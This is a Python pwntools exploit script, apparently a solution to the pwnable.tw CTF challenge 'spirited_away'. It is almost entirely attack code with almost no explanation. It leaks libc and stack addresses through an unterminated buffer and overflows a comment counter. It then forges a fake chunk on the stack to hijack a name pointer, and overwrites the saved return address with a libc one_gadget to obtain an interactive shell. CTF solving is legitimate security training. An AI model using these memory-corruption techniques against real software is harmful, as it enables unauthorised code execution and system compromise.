from pwn import *
context.log_level="debug"
if len(sys.argv)==2:
	conn=remote("chall.pwnable.tw",10204)
	pid=0
else:
	conn=process("./spirited_away")
	pid=conn.pid

def make_comment(name,age,why,comment):
	conn.sendlineafter("Please enter your name: ",name)
	conn.sendlineafter("Please enter your age: ",age)
	conn.sendlineafter("Why did you came to see this movie? ",why)
	conn.sendlineafter("Please enter your comment: ",comment)
def keep(flag):
	conn.sendlineafter("Would you like to leave another comment? <y/n>: ",flag)
def debug():
	print "pid",pid
	pause()

payload="a"*35
make_comment("","1",payload,"")
conn.recvuntil(payload+"\n")
libc_address=u32(conn.recv("4"))-0x5d39f
log.debug("libc address 0x%x"%libc_address)
keep("y")

payload="a"*55
make_comment("","1",payload,"")
conn.recvuntil(payload+"\n")
ebp=u32(conn.recv(4))-0x20
log.debug("survey ebp address 0x%x"%ebp)
keep("y")
for i in range(100):
	make_comment("","1","","")
	keep("y")

name="a"
comment="a"*0x54+p32(ebp-0x48)# name pointer
f={
	0x0:p32(0),
	0x4:p32(0x41),
	0x40:p32(0),
	0x44:p32(0x409),
}
why=fit(f,filler="a",length=0x4f)
make_comment(name,"1",why,comment)
keep("y")

# now the name is stored in stack
# overflow it!

#one_gadget
jump_address=0x5f065+libc_address
name_payload="a"*0x48+p32(ebp)+p32(jump_address)
make_comment(name_payload,"1","","")
keep("n")
conn.interactive()


